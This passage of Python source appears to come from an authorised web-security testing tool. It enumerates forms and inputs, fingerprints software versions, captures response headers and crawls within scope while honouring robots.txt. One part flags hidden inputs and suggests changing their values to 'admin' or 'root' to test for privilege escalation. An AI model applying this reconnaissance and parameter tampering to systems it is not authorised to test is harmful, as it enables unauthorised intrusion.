                    method: (f.getAttribute('method') || 'GET').toUpperCase(),
                    input_count: inputs.length,
                    inputs: inputDetails
                };
            })""",
            default=[],
        )
        result["forms"] = forms

        # --- All inputs (standalone, not just inside forms) ---
        all_inputs = await _pw(page.eval_on_selector_all,
            "input",
            """els => els.map(i => ({
                name: i.name || i.id || '',
                type: (i.type || 'text'),
                value: (i.value || '').substring(0, 200),
                hidden: (i.type === 'hidden')
            }))""",
            default=[],
        )
        result["inputs"] = all_inputs

        # --- Textareas ---
        textareas = await _pw(page.eval_on_selector_all,
            "textarea",
            """els => els.map(t => ({
                name: t.name || t.id || '',
                value: (t.value || '').substring(0, 200),
                rows: t.rows || 2,
                cols: t.cols || 20
            }))""",
            default=[],
        )
        result["textareas"] = textareas

        # --- Selects ---
        selects = await _pw(page.eval_on_selector_all,
            "select",
            """els => els.map(s => ({
                name: s.name || s.id || '',
                options: Array.from(s.options).map(o => ({
                    value: o.value,
                    text: o.text
                })),
                selected: (s.value || '')
            }))""",
            default=[],
        )
        result["selects"] = selects

        # --- Fetch/XHR calls in inline JS ---
        scripts = await _pw(page.eval_on_selector_all,
            "script:not([src])",
            "els => els.map(e => e.textContent || '')",
            default=[],
        )
        fetch_re = re.compile(
            r"(?:fetch|XMLHttpRequest|\.open)\s*\(\s*['\"]([^'\"]+)['\"]",
            re.IGNORECASE,
        )
        method_re = re.compile(
            r"method\s*:\s*['\"]([A-Z]+)['\"]", re.IGNORECASE,
        )
        body_re = re.compile(
            r"body\s*:\s*['\"]([^'\"]+)['\"]",
        )
        for script_text in scripts:
            for m in fetch_re.finditer(script_text):
                fetch_url = m.group(1)
                # Look for method + body near the fetch call.
                context = script_text[m.end():m.end()+500]
                method_m = method_re.search(context)
                method = method_m.group(1).upper() if method_m else "GET"
                body_m = body_re.search(context)
                body_params = []
                if body_m:
                    body = body_m.group(1)
                    # Parse URL-encoded body.
                    from urllib.parse import parse_qs
                    for name in parse_qs(body).keys():
                        body_params.append(name)
                result["fetch_calls"].append({
                    "url": fetch_url,
                    "method": method,
                    "body_params": body_params,
                })

        # --- Flag hidden inputs as privilege escalation risks ---
        for inp in all_inputs:
            if inp.get("hidden") and inp.get("name"):
                warning = {
                    "name": inp["name"],
                    "value": inp.get("value", ""),
                    "warning": "Hidden parameter — potential privilege escalation. "
                               "Test by changing value.",
                    "suggested_test": f"Change '{inp['name']}' from '{inp.get('value','')}' "
                                      f"to 'admin' or 'root' and submit the form.",
                }
                result["hidden_inputs_flagged"].append(warning)

        return result


# ============================================================================
# SECTION 8.11 — SOFTWARE INVENTORY (Passive Fingerprinting)
# ============================================================================
#
# The SoftwareInventoryAnalyzer scans already-captured HTTP headers + HTML
# source to extract product names + versions. It is purely PASSIVE — no
# extra requests are made.
#
# Sources scanned:
#   1. HTTP Headers: Server, X-Powered-By, X-AspNet-Version, X-Generator
#   2. HTML Meta Tags: <meta name="generator" content="WordPress 6.5.2">
#   3. HTML Comments: <!-- Built with Laravel v9 -->, <!-- Drupal 10.1 -->
#   4. JavaScript file URLs: /jquery-3.6.0.min.js, /react.production.min.js
#   5. CSS file URLs: /bootstrap-5.3.0.min.css
#
# For each detected product, the analyzer outputs:
#   - product: e.g. "Apache", "WordPress", "jQuery"
#   - version: e.g. "2.4.49", "6.5.2", "3.6.0"
#   - category: "Web Server", "CMS", "JS Framework", "CSS Framework", "Backend"
#   - source: where it was found (header name, meta tag, comment, JS URL)
#   - advisory: static text telling the engineer to check NVD/vendor CVE DB
#
# CRITICAL: This is NOT a CVE scanner. It does NOT query any database. It
# only inventories what's detected and advises manual verification.

class SoftwareInventoryAnalyzer:
    """Passive software fingerprinting from headers + HTML source."""

    # Header name → (product name, category, version extraction regex)
    # The version is extracted from the header VALUE, not the name.
    HEADER_FINGERPRINTS = {
        "server": {
            "products": [
                ("Apache", "Web Server", re.compile(r"Apache/([\d.]+)")),
                ("nginx", "Web Server", re.compile(r"nginx/([\d.]+)")),
                ("IIS", "Web Server", re.compile(r"Microsoft-IIS/([\d.]+)")),
                ("LiteSpeed", "Web Server", re.compile(r"LiteSpeed")),
                ("Tomcat", "Web Server", re.compile(r"Tomcat/([\d.]+)")),
                ("Caddy", "Web Server", re.compile(r"Caddy")),
                ("Gunicorn", "App Server", re.compile(r"gunicorn/([\d.]+)")),
                ("uWSGI", "App Server", re.compile(r"uWSGI/([\d.]+)")),
                ("Werkzeug", "App Server", re.compile(r"Werkzeug/([\d.]+)")),
                ("Python", "Language Runtime", re.compile(r"Python/([\d.]+)")),
                ("Waitress", "App Server", re.compile(r"waitress \(([\d.]+)\)")),
                ("CherryPy", "App Server", re.compile(r"CherryPy/([\d.]+)")),
                ("Tornado", "App Server", re.compile(r"TornadoServer/([\d.]+)")),
                ("Hypercorn", "App Server", re.compile(r"hypercorn-([\w-]+)")),
                ("Daphne", "App Server", re.compile(r"daphne")),
                ("Twisted", "App Server", re.compile(r"TwistedWeb/([\d.]+)")),
                ("OpenResty", "Web Server", re.compile(r"openresty/([\d.]+)")),
            ]
        },
        "x-powered-by": {
            "products": [
                ("PHP", "Backend", re.compile(r"PHP/([\d.]+)")),
                ("ASP.NET", "Backend", re.compile(r"ASP\.NET")),
                ("Express", "Backend", re.compile(r"Express")),
                ("Servlet", "Backend", re.compile(r"Servlet/([\d.]+)")),
                ("JSP", "Backend", re.compile(r"JSP/([\d.]+)")),
                ("Next.js", "JS Framework", re.compile(r"Next\.js/?([\d.]*)")),
                ("Restify", "Backend", re.compile(r"Restify/([\d.]+)")),
            ]
        },
        "x-aspnet-version": {
            "products": [
                ("ASP.NET", "Backend", re.compile(r"([\d.]+)")),
            ]
        },
        "x-generator": {
            "products": [
                ("WordPress", "CMS", re.compile(r"WordPress ([\d.]+)")),
                ("Drupal", "CMS", re.compile(r"Drupal ([\d.]+)")),
                ("Joomla", "CMS", re.compile(r"Joomla!?\s*([\d.]*)")),
                ("Ghost", "CMS", re.compile(r"Ghost ([\d.]+)")),
            ]
        },
    }

    # Meta tag generator content patterns.
    META_PATTERNS = [
        ("WordPress", "CMS", re.compile(r"WordPress\s+([\d.]+)")),
        ("Drupal", "CMS", re.compile(r"Drupal\s+([\d.]+)")),
        ("Joomla", "CMS", re.compile(r"Joomla!?\s*([\d.]*)")),
        ("Ghost", "CMS", re.compile(r"Ghost\s+([\d.]+)")),
        ("Hugo", "Static Site", re.compile(r"Hugo\s+([\d.]+)")),
        ("Jekyll", "Static Site", re.compile(r"Jekyll\s+v?([\d.]+)")),
        ("Gatsby", "Static Site", re.compile(r"Gatsby\s+v?([\d.]+)")),
        ("Wix", "CMS", re.compile(r"Wix\.com")),
        ("Squarespace", "CMS", re.compile(r"Squarespace")),
        ("Shopify", "CMS", re.compile(r"Shopify")),
    ]

    # HTML comment patterns (e.g. <!-- Built with Laravel v9 -->).
    COMMENT_PATTERNS = [
        ("Laravel", "Backend", re.compile(r"(?:built with|powered by)\s+Laravel\s+v?([\d.]+)", re.I)),
        ("Rails", "Backend", re.compile(r"(?:built with|powered by)\s+Rails\s+v?([\d.]+)", re.I)),
        ("Django", "Backend", re.compile(r"(?:built with|powered by)\s+Django\s+v?([\d.]+)", re.I)),
        ("Spring", "Backend", re.compile(r"(?:built with|powered by)\s+Spring\s+v?([\d.]+)", re.I)),
        ("Express", "Backend", re.compile(r"(?:built with|powered by)\s+Express\s+v?([\d.]+)", re.I)),
        ("Flask", "Backend", re.compile(r"(?:built with|powered by)\s+Flask\s+v?([\d.]+)", re.I)),
    ]

    # JavaScript library URL patterns (extract version from filename).
    JS_PATTERNS = [
        ("jQuery", "JS Framework", re.compile(r"jquery[.-]([\d.]+)\.min?\.js", re.I)),
        ("jQuery", "JS Framework", re.compile(r"jquery[.-]([\d.]+)\.js", re.I)),
        ("React", "JS Framework", re.compile(r"react[.\-/](?:umd/)?(?:react[.\-/])?production(?:\.min)?\.js", re.I)),
        ("React", "JS Framework", re.compile(r"react[.\-/]([\d.]+)", re.I)),
        ("Vue.js", "JS Framework", re.compile(r"vue[.\-/](?:global\.|runtime\.|([\d.]+))", re.I)),
        ("Angular", "JS Framework", re.compile(r"angular(?:\.min)?\.js", re.I)),
        ("Angular", "JS Framework", re.compile(r"@angular/([\d.]+)", re.I)),
        ("Bootstrap", "CSS Framework", re.compile(r"bootstrap[.\-/]([\d.]+)", re.I)),
        ("Bootstrap", "CSS Framework", re.compile(r"bootstrap(?:\.bundle)?\.min?\.js", re.I)),
        ("lodash", "JS Framework", re.compile(r"lodash[.\-/]([\d.]+)", re.I)),
        ("moment.js", "JS Framework", re.compile(r"moment(?:\.min)?\.js", re.I)),
        ("axios", "JS Framework", re.compile(r"axios(?:\.min)?\.js", re.I)),
        ("backbone.js", "JS Framework", re.compile(r"backbone(?:\.min)?\.js", re.I)),
        ("ember.js", "JS Framework", re.compile(r"ember(?:\.min)?\.js", re.I)),
        ("D3.js", "JS Framework", re.compile(r"d3(?:\.min)?\.js", re.I)),
        ("Three.js", "JS Framework", re.compile(r"three(?:\.min)?\.js", re.I)),
        ("GSAP", "JS Framework", re.compile(r"gsap(?:\.min)?\.js", re.I)),
        ("Tailwind CSS", "CSS Framework", re.compile(r"tailwind", re.I)),
        ("Bulma", "CSS Framework", re.compile(r"bulma(?:\.min)?\.css", re.I)),
        ("Foundation", "CSS Framework", re.compile(r"foundation(?:\.min)?\.css", re.I)),
        ("Materialize", "CSS Framework", re.compile(r"materialize(?:\.min)?\.css", re.I)),
    ]

    # CSS URL patterns (extract version from filename).
    CSS_PATTERNS = [
        ("Bootstrap", "CSS Framework", re.compile(r"bootstrap[.\-/]([\d.]+)", re.I)),
        ("Bootstrap", "CSS Framework", re.compile(r"bootstrap(?:\.min)?\.css", re.I)),
        ("Tailwind CSS", "CSS Framework", re.compile(r"tailwind(?:\.min)?\.css", re.I)),
        ("Bulma", "CSS Framework", re.compile(r"bulma(?:\.min)?\.css", re.I)),
        ("Foundation", "CSS Framework", re.compile(r"foundation(?:\.min)?\.css", re.I)),
        ("Font Awesome", "CSS Framework", re.compile(r"font-?awesome[.\-/]([\d.]+)", re.I)),
        ("Material Icons", "CSS Framework", re.compile(r"material-?icons", re.I)),
    ]

    def __init__(self, logger: ExecutionTrailLogger) -> None:
        self.logger = logger

    def analyze(
        self,
        header_records: List["HeaderRecord"],
        page_sources: Dict[str, str],
    ) -> Dict[str, Any]:
        """Analyze headers + HTML sources for software fingerprints.

        Returns a dict:
          - items: List of {product, version, category, source, source_list,
                   evidence, evidence_list, source_urls, advisory}
          - summary: Dict of {category: count}

        DEDUPLICATION:
        The same product+version+category is reported ONCE, even when matched
        by multiple patterns (e.g. Bootstrap is matched both as a JS file URL
        AND a CSS file URL — those collapse into a single row). All the
        sources + evidence are merged into source_list / evidence_list on the
        single row, and source_urls holds the raw page URLs it was found on
        (consumed by the UI's "Found On" column). The first source seen is
        kept as `source` for backwards compatibility with older UI code.
        """
        items: List[Dict[str, Any]] = []
        # Key: (product_lower, version_lower, category) -> index in `items`.
        # NOTE: `source` is deliberately NOT part of the key — that was the
        # old behaviour and it produced duplicate rows for CSS frameworks
        # (matched once via JS_PATTERNS, once via CSS_PATTERNS).
        seen: Dict[Tuple[str, str, str], int] = {}

        advisory_template = (
            "Detected {product} {version}. Please manually verify this "
            "version against the NVD / vendor CVE database for known "
            "vulnerabilities and end-of-life status."
        )

        def _extract_url(source_str: str, evidence: str) -> str:
            """Best-effort: pull a page URL out of a '... on URL' source string
            or fall back to the evidence if it looks like a URL."""
            if " on " in source_str:
                return source_str.split(" on ", 1)[1].strip()
            if evidence.startswith(("http://", "https://")):
                return evidence
            return ""

        def _add(product: str, version: str, category: str,
                 source: str, evidence: str) -> None:
            """Insert or merge a detection. Dedups by (product, version,
            category); merges sources/evidence/urls into the existing row."""
            key = (product.lower(), version.lower(), category)
            url = _extract_url(source, evidence)
            idx = seen.get(key)
            if idx is None:
                seen[key] = len(items)
                items.append({
                    "product": product,
                    "version": version,
                    "category": category,
                    "source": source,                # first source (back-compat)
                    "source_list": [source],
                    "evidence": evidence,             # first evidence (back-compat)
                    "evidence_list": [evidence],
                    "source_urls": [url] if url else [],
                    "advisory": advisory_template.format(
                        product=product, version=version),
                })
            else:
                row = items[idx]
                if source not in row["source_list"]:
                    row["source_list"].append(source)
                if evidence not in row["evidence_list"]:
                    row["evidence_list"].append(evidence)
                if url and url not in row["source_urls"]:
                    row["source_urls"].append(url)
                # Surface multi-source provenance in the primary field so it
                # is visible even in older UIs that only read `source`.
                if len(row["source_list"]) > 1:
                    row["source"] = f"{len(row['source_list'])} sources"

        # --- 1. Scan HTTP Headers ---
        for h in header_records:
            name_lower = h.name.lower()
            if name_lower in self.HEADER_FINGERPRINTS:
                fp = self.HEADER_FINGERPRINTS[name_lower]
                for product, category, version_re in fp["products"]:
                    m = version_re.search(h.value)
                    if m:
                        version = m.group(1) if m.lastindex else "unknown"
                        _add(product, version, category,
                             f"Header: {h.name}", f"{h.name}: {h.value}")

        # --- 2. Scan HTML source (meta tags, comments, JS/CSS URLs) ---
        for url, source_html in page_sources.items():
            # --- 2a. Meta tags ---
            # <meta name="generator" content="WordPress 6.5.2">
            meta_re = re.compile(
                r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)["\']',
                re.I,
            )
            for m in meta_re.finditer(source_html):
                content = m.group(1)
                for product, category, pat in self.META_PATTERNS:
                    vm = pat.search(content)
                    if vm:
                        version = vm.group(1) if vm.lastindex else "unknown"
                        _add(product, version, category,
                             f"Meta tag (generator) on {url}",
                             f'<meta name="generator" content="{content}">')

            # --- 2b. HTML comments ---
            # <!-- Built with Laravel v9 --> <!-- Drupal 10.1 -->
            comment_re = re.compile(r"<!--(.+?)-->", re.DOTALL)
            for m in comment_re.finditer(source_html):
                comment_text = m.group(1)
                for product, category, pat in self.COMMENT_PATTERNS:
                    vm = pat.search(comment_text)
                    if vm:
                        version = vm.group(1) if vm.lastindex else "unknown"
                        _add(product, version, category,
                             f"HTML comment on {url}",
                             m.group(0).strip()[:200])

            # --- 2c. JavaScript file URLs ---
            # <script src="/jquery-3.6.0.min.js">
            # <script src="https://cdn.example.com/react@18.2.0/umd/react.production.min.js">
            script_re = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)
            for m in script_re.finditer(source_html):
                js_url = m.group(1)
                for product, category, pat in self.JS_PATTERNS:
                    vm = pat.search(js_url)
                    if vm:
                        version = vm.group(1) if vm.lastindex else "unknown"
                        _add(product, version, category,
                             f"JS file URL on {url}", js_url)

            # --- 2d. CSS file URLs ---
            # <link href="/bootstrap-5.3.0.min.css" rel="stylesheet">
            link_re = re.compile(r'<link[^>]+href=["\']([^"\']+\.css[^"\']*)["\']', re.I)
            for m in link_re.finditer(source_html):
                css_url = m.group(1)
                for product, category, pat in self.CSS_PATTERNS:
                    vm = pat.search(css_url)
                    if vm:
                        version = vm.group(1) if vm.lastindex else "unknown"
                        _add(product, version, category,
                             f"CSS file URL on {url}", css_url)

        # --- Build summary ---
        summary: Dict[str, int] = {}
        for item in items:
            summary[item["category"]] = summary.get(item["category"], 0) + 1

        self.logger.log(
            "software_inventory_done",
            f"detected {len(items)} products across {len(summary)} categories",
        )

        return {
            "items": items,
            "summary": summary,
        }


# ============================================================================
# SECTION 9 — HEADER CAPTURE ("Judge" Mode)
# ============================================================================
#
# The header capture module navigates to the target URL with Playwright,
# intercepts the initial response AND every redirect response, and records
# the FULL header set — including headers that are commonly stripped by
# HTTP clients (e.g. Set-Cookie, Date, Server). We treat the user's
# whitelist.txt as a REFERENCE, not a filter: every response header is
# reported, and each one is cross-referenced against the reference list
# so the engineer can spot anomalies at a glance.
#
# IMPORTANT TRADE-OFF: We use Playwright (a real browser) rather than
# `requests` or `urllib` because many modern applications behave
# differently for non-browser clients (returning different headers,
# challenge pages, or 4xx status). A real browser gives us the headers
# the engineer would actually see when manually testing.

class HeaderCapture:
    """Captures and cross-references response headers from the target URL.

    Workflow:
      1. Read the user's reference list (or fall back to defaults).
         The whitelist format supports THREE forms per line:
           a) 'Header-Name'                       -> header expected present, any value OK
           b) 'Header-Name: expected-value'        -> header expected present with this exact value
           c) 'Header-Name: v1|v2|v3'              -> header expected present with one of these values
         Form (c) is useful for headers like X-Frame-Options where both
         DENY and SAMEORIGIN are acceptable security postures.
      2. Navigate to the target URL via Playwright, intercepting responses.
      3. Record every header from every response in the redirect chain.
      4. Cross-reference each header against the reference list, including
         value matching where expected values were declared.
      5. Save the raw header dict to headers_raw.json and return a list
         of HeaderRecord objects for the HTML report.
    """

    def __init__(
        self,
        reference_path: Optional[Path],
        logger: ExecutionTrailLogger,
    ) -> None:
        self.logger = logger
        # The reference is now a dict mapping lowercase header name to a
        # list of acceptable values. An empty list means "any value is OK"
        # (the header just needs to be present). A non-empty list means
        # the actual value must match one of the entries (case-insensitive
        # substring match, to tolerate minor variations like trailing
        # semicolons or differing parameter order).
        self.reference: Dict[str, List[str]] = self._load_reference(reference_path)

    def _load_reference(self, path: Optional[Path]) -> Dict[str, List[str]]:
        """Load the reference header list from disk, or use defaults.

        Returns a dict mapping lowercase header name -> list of acceptable
        values. Empty list means "any value acceptable".

        WHY A DICT NOT A SET: We need to look up the expected value(s) for
        each header during capture, so we can flag mismatches. A set only
        supports membership tests; a dict supports both membership and
        value retrieval in O(1).
        """
        if path is None:
            self.logger.log(
                "header_capture_init",
                "no --headers file provided; using DEFAULT_REFERENCE_HEADERS "
                "(name-only; no expected values)",
            )
            # Default list is name-only (no expected values). We model this
            # as a dict with empty value lists.
            return {h.lower(): [] for h in DEFAULT_REFERENCE_HEADERS}
        if not path.exists():
            self.logger.log(
                "header_capture_init",
                f"--headers file {path} not found; falling back to defaults",
            )
            return {h.lower(): [] for h in DEFAULT_REFERENCE_HEADERS}
        text = path.read_text(encoding="utf-8", errors="replace")
        # Parse each non-comment line. The line may be:
        #   'Header-Name'                       -> {name: []}
        #   'Header-Name: value'                -> {name: ['value']}
        #   'Header-Name: v1|v2|v3'             -> {name: ['v1','v2','v3']}
        reference: Dict[str, List[str]] = {}
        line_count = 0
        for raw_line in text.splitlines():
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            line_count += 1
            # Split on the FIRST colon only — header values may legally
            # contain colons (e.g. Content-Type: text/html; charset=utf-8).
            if ":" in line:
                name_part, _, value_part = line.partition(":")
                name = name_part.strip()
                value_part = value_part.strip()
                # The '|' separator lets the user declare multiple
                # acceptable values. We strip each one.
                acceptable = [v.strip() for v in value_part.split("|")
                              if v.strip()]
            else:
                name = line
                acceptable = []  # empty = any value acceptable
            # Normalise header name to lowercase (RFC 9110 §5.1).
            reference[name.lower()] = acceptable
        self.logger.log(
            "header_capture_init",
            f"loaded {line_count} reference headers from {path} "
            f"({sum(1 for v in reference.values() if v)} with expected values)",
        )
        return reference

    def _check_value_matches(
        self, actual_value: str, acceptable_values: List[str],
    ) -> bool:
        """Return True if `actual_value` matches the whitelist policy.

        Matching rules (intentionally lenient to reduce false positives):
          - If acceptable_values is empty, ANY actual value matches
            (the whitelist only required the header to be present).
          - Otherwise, the actual value must match one of the acceptable
            values using NORMALIZED comparison (see _normalize_header_value).
          - For headers where EXACT matching is required (rare), the
            engineer should audit the raw headers_raw.json file directly.
        """
        if not acceptable_values:
            return True
        actual_norm = self._normalize_header_value(actual_value)
        for expected in acceptable_values:
            expected_norm = self._normalize_header_value(expected)
            # Substring check (normalized) — catches cases where the
            # expected value is a subset of the actual (e.g. expected
            # "max-age=31536000" matches actual "max-age=31536000;
            # includeSubDomains").
            if expected_norm in actual_norm:
                return True
            # Also check if ALL tokens of the expected value are present
            # in the actual value (order-independent). This catches
            # "max-age=0, public" vs "public, max-age=0".
            expected_tokens = set(expected_norm.split(","))
            actual_tokens = set(actual_norm.split(","))
            if expected_tokens and expected_tokens.issubset(actual_tokens):
                return True
        return False

    @staticmethod
    def _normalize_header_value(value: str) -> str:
        """Normalize a header value for comparison.

        Many HTTP headers use comma-separated directives where ORDER DOES
        NOT MATTER (e.g. Cache-Control, Content-Security-Policy, Vary).
        For example, these are semantically identical:
            max-age=0, public
            public, max-age=0

        This function normalizes by:
          1. Lowercasing (case-insensitive comparison)
          2. Splitting on commas
          3. Stripping whitespace from each token
          4. Sorting the tokens (so order doesn't matter)
          5. Rejoining with ", "

        For headers where order DOES matter (rare — e.g. Content-Disposition),
        the engineer should audit headers_raw.json directly.
        """
        # Split on comma, strip, lowercase, sort, rejoin.
        # We DON'T split on semicolons because some headers use semicolons
        # for parameters where order might matter (e.g. Content-Type:
        # text/html; charset=utf-8 — charset must come after the MIME type).
        tokens = [t.strip().lower() for t in value.split(",") if t.strip()]
        tokens.sort()
        return ", ".join(tokens)

    async def capture(
        self,
        page: Page,
        url: str,
        output_dir: Path,
    ) -> List[HeaderRecord]:
        """Navigate to `url`, capture all headers, save raw JSON, return records.

        We register a page.on('response') handler BEFORE navigating so we
        capture responses for the initial document AND every redirect
        (Playwright fires one 'response' event per HTTP response in the
        chain, including 3xx intermediates).
        """
        captured: List[Dict[str, Any]] = []
        # The handler appends a snapshot of each response to `captured`.
        # We use a list-of-dicts (not a dict-of-headers) because the same
        # header name may legitimately appear multiple times (e.g. multiple
        # Set-Cookie headers) and we don't want to lose that information.

        async def _on_response(resp: PWResponse) -> None:
            try:
                # resp.all_headers() returns a dict (last value wins on
                # duplicates). For full fidelity we also capture the
                # multi-value form via resp.headers_array(), which is a
                # coroutine in modern Playwright — we MUST await it.
                hdrs = await resp.all_headers()
                # headers_array() returns a list of {name, value} dicts,
                # preserving duplicates (e.g. multiple Set-Cookie headers).
                # We wrap it in a try/except because some Playwright
                # versions return a plain list (not a coroutine).
                try:
                    multi = resp.headers_array()
                    # If we got a coroutine (newer Playwright), await it.
                    if hasattr(multi, "__await__"):
                        multi = await multi  # type: ignore
                except Exception:
                    multi = []
                captured.append({
                    "url": resp.url,
                    "status": resp.status,
                    "headers": dict(hdrs),
                    "multi_headers": multi,
                })
            except Exception as e:
                # Don't let a single response failure abort the whole capture.
                self.logger.log(
                    "header_capture_error",
                    f"failed to read headers from {resp.url}: {e}",
                )

        page.on("response", lambda r: asyncio.create_task(_on_response(r)))

        try:
            # wait_until='networkidle' ensures we capture headers from any
            # XHR/fetch calls fired by the page's JS after load. This is
            # important for SPAs where the initial document is a thin shell
            # and the interesting headers come from API responses.
            # Wrapped in _pw() for a 5s hard cap — networkidle NEVER resolves
            # on pages with long-polling/SSE/WebSocket, which would freeze
            # the entire crawl phase.
            await _pw(page.goto, url, wait_until="domcontentloaded", timeout=10000,
                      default=None)
        except PWTimeoutError:
            self.logger.log(
                "header_capture_warn",
                f"navigation to {url} timed out; capturing partial headers",
            )
        except Exception as e:
            self.logger.log(
                "header_capture_error",
                f"navigation to {url} failed: {e}",
            )

        # Give any in-flight requests a brief grace period to complete so
        # we don't miss late-arriving headers. 1.5s is a heuristic; tune
        # up if the target is genuinely slow.
        await asyncio.sleep(1.5)

        # Flatten the captured responses into a list of HeaderRecord.
        records: List[HeaderRecord] = []
        # We dedupe by (url, header_name) so a header seen in the initial
        # response AND a redirect isn't reported twice. The first value wins.
        seen: Set[Tuple[str, str]] = set()
        for entry in captured:
            resp_url = entry["url"]
            for name, value in entry["headers"].items():
                key = (resp_url, name.lower())
                if key in seen:
                    continue
                seen.add(key)
                name_lower = name.lower()
                in_ref = name_lower in self.reference
                # Look up the expected value(s) for this header. If the
                # header is in the reference but has an empty value list,
                # expected_value stays "" and value_matches_expected is True
                # (vacuously — any value is acceptable).
                acceptable = self.reference.get(name_lower, [])
                expected_display = " | ".join(acceptable) if acceptable else ""
                matches = self._check_value_matches(value, acceptable)
                records.append(HeaderRecord(
                    name=name,
                    value=value,
                    in_reference=in_ref,
                    expected_value=expected_display,
                    value_matches_expected=matches,
                    source_url=resp_url,
                ))

        # Save the raw header set as JSON for import into Burp etc.
        raw_path = output_dir / "headers_raw.json"
        raw_path.parent.mkdir(parents=True, exist_ok=True)
        raw_path.write_text(
            json.dumps(captured, indent=2, ensure_ascii=False, default=str),
            encoding="utf-8",
        )

        # Also save the comparison results (HeaderRecord objects with
        # in_reference, expected_value, value_matches_expected) so the
        # web UI can render Table A/B/C without re-doing the comparison.
        comparison_path = output_dir / "headers_comparison.json"
        comparison_path.write_text(
            json.dumps([asdict(h) for h in records], indent=2,
                       ensure_ascii=False, default=str),
            encoding="utf-8",
        )

        self.logger.log(
            "header_capture_done",
            f"captured {len(records)} unique headers across "
            f"{len(captured)} responses; raw saved to {raw_path.name}; "
            f"comparison saved to {comparison_path.name}",
        )
        return records


# ============================================================================
# SECTION 10 — RECURSIVE WEB CRAWLER & SCOPE ENFORCEMENT
# ============================================================================
#
# The crawler is BREADTH-FIRST (BFS) so that shallow, high-value endpoints
# (login, admin, search) are discovered before deep, low-value ones. BFS
# also bounds the worst-case runtime: a depth-3 crawl with avg fanout 20
# visits at most ~8400 URLs, which is tractable.
#
# SCOPE ENFORCEMENT is the most security-critical part of this module.
# A crawler that escapes scope can:
#   - Hit third-party domains (legal/compliance risk).
#   - Trigger destructive actions on linked admin panels.
#   - Burn the engineer's authorisation.
# We enforce scope at THREE layers:
#   1. Domain restriction (must match the target's registrable domain).
#   2. --scope allow-patterns (URL path must match at least one).
#   3. --exclude deny-patterns (URL path must not match any).
# Plus an additional guard: robots.txt is fetched and parsed, and its
# Disallow rules are honoured unless --ignore-robots is set.

class RobotsRule:
    """A single robots.txt rule (path prefix, allow or disallow)."""

    def __init__(self, path: str, allow: bool) -> None:
        # robots.txt paths are matched as prefixes per Google's spec.
        # We use simple startswith() here; full spec compliance with
        # wildcards ($, *) would require a more complex matcher. For our
        # use case (avoiding fuzzing disallowed paths) prefix matching is
        # sufficient and easier to audit.
        self.path = path
        self.allow = allow


class RobotsParser:
    """Parses robots.txt for 'User-agent: *' rules.

    We deliberately only honour the 'User-agent: *' group. Parsing rules
    for specific bots (e.g. 'User-agent: Googlebot') would be misleading
    — we are not Googlebot, and the site may disallow us specifically
    while allowing Google. The 'User-agent: *' group is the conservative
    default.
    """

    def __init__(self, logger: ExecutionTrailLogger) -> None:
        self.logger = logger
        self.rules: List[RobotsRule] = []
        self.fetched = False
        self.raw_text = ""

    async def fetch(self, base_url: str, page: Page) -> None:
        """Fetch and parse {base_url}/robots.txt."""
        parsed = urlparse(base_url)
        robots_url = f"{parsed.scheme}://{parsed.netloc}/robots.txt"
        try:
            resp = await _pw(page.goto, robots_url, wait_until="domcontentloaded",
                                   timeout=10000, default=None)
            if resp is None or resp.status >= 400:
                self.logger.log(
                    "robots_fetch",
                    f"{robots_url} returned status "
                    f"{resp.status if resp else 'None'}; assuming permissive",
                )
                self.fetched = True
                return
            self.raw_text = await resp.text()
            self._parse()
            self.logger.log(
                "robots_fetch",
                f"parsed {len(self.rules)} 'User-agent: *' rules",
            )
        except Exception as e:
            self.logger.log(
                "robots_fetch",
                f"failed to fetch {robots_url}: {e}",
            )
        finally:
            self.fetched = True

    def _parse(self) -> None:
        """Parse the raw robots.txt text into RobotsRule objects.

        We implement a minimal subset of the robots.txt spec:
          - 'User-agent: *' starts a group we honour.
          - 'Disallow: /path' adds a deny rule.
          - 'Allow: /path' adds an allow rule (overrides deny).
          - Comments (lines starting with #) are ignored.
          - Other groups (specific user-agents) are skipped entirely.
        """
        in_star_group = False
        for raw_line in self.raw_text.splitlines():
            line = raw_line.split("#", 1)[0].strip()  # strip comments
            if not line:
                continue
            if ":" not in line:
                continue
            field, _, value = line.partition(":")
            field = field.strip().lower()
            value = value.strip()
            if field == "user-agent":
                # A new user-agent line starts a new group. We only care
                # about the '*' group; any other agent resets our flag.
                in_star_group = (value == "*")
            elif field in ("disallow", "allow") and in_star_group:
                # An empty 'Disallow:' means 'allow everything'. We model
                # this as an explicit Allow rule with path ''.
                self.rules.append(RobotsRule(
                    path=value,
                    allow=(field == "allow"),
                ))

    def is_allowed(self, url: str) -> bool:
        """Return True if `url` is permitted by robots.txt.

        Per the spec, the most-specific match wins. Our rules are
        evaluated in insertion order; later rules override earlier ones
        for the same path prefix. An empty rule set means 'allow all'.
        """
        if not self.rules:
            return True
        parsed = urlparse(url)
        path = parsed.path or "/"
        allowed = True  # default allow
        for rule in self.rules:
            if path.startswith(rule.path):
                allowed = rule.allow
        return allowed


class Crawler:
    """BFS web crawler with strict scope enforcement.

    The crawler yields CrawledURL records as it discovers them. The
    orchestrator decides what to do with each (fuzz, screenshot, skip).
    """

    def __init__(
        self,
        target_url: str,
        depth: int,
        scope_patterns: List[str],
        exclude_patterns: List[str],
        allow_external: bool,
        ignore_robots: bool,
        rate_limiter: RateLimiter,
        logger: ExecutionTrailLogger,
    ) -> None:
        self.target_url = target_url
        self.max_depth = max(0, int(depth))
        self.scope_patterns = scope_patterns or []
        self.exclude_patterns = exclude_patterns or []
        self.allow_external = bool(allow_external)
        self.ignore_robots = bool(ignore_robots)
        self.rate_limiter = rate_limiter
        self.logger = logger
        # Parse the target's registrable domain so we can refuse external
        # links. We use a simple heuristic: the last two labels of the
        # hostname (e.g. 'example.com' from 'api.app.example.com'). This
        # is intentionally naive — full PSL (public suffix list) support
        # would require an external dependency, which we forbid.
        parsed = urlparse(target_url)
        self.target_scheme = parsed.scheme
        self.target_host = parsed.hostname or ""
        self.target_port = parsed.port  # None if not explicitly in URL
        labels = self.target_host.split(".")
        # Handle the common case of 'example.com' (2 labels) and
        # 'sub.example.com' (3 labels). Country-code TLDs like '.co.uk'
        # would need PSL; we warn the engineer if the TLD looks like one.
        self.registrable_domain = ".".join(labels[-2:]) if len(labels) >= 2 else self.target_host
        if len(labels) >= 3 and labels[-2] in ("co", "com", "org", "gov", "edu", "net"):
            # Likely a country-code second-level domain like 'example.co.uk'.
            # Take the last three labels. (Heuristic — may misclassify
